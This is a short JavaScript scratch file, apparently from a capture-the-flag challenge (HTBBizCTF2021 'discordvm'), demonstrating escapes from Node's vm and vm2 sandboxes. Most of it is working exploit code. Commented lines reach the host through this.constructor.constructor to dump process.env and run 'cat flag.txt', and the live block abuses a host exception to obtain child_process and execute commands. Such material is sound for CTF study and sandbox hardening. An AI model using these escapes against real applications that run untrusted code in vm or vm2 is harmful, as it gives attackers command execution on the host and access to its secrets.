
// switch btw samdbox modules HERE
// const VM = require('vm');
const { NodeVM } = require('vm2');

// const trusted = VM.runInNewContext(`let a = 'greetings!'; a;`)

// print host env variables by breaking out of sandbox
// const env = VM.runInNewContext(`
//     this.constructor.constructor("return(this.process.env)")()
// `);

// HTBBizCTF2021 discordvm challenge flag 
// const flag = VM.runInNewContext(`
//     this.constructor.constructor("return(this.process.mainModule.require('child_process').execSync('cat flag.txt')).toString()")()
// `);

// VM2 process not accessible bcoz Proxies
// new VM().run('this.constructor.constructor("return process")()');

// removing listener causes host to throw exception, catch the exception from the host back in the VM’s catch block and use that to climb to process
new NodeVM().run(`
    try{
        this.process.removeListener();
    }
    catch (host_exception) {
        console.log(host_exception.toString());
        host_constructor = host_exception.constructor.constructor;
        host_process = host_constructor('return this')().process;
        child_process = host_process.mainModule.require("child_process");
        console.log(child_process.execSync("ls").toString());
    }
`);
// console.log(trusted)

// console.log(env)
// console.log(flag)
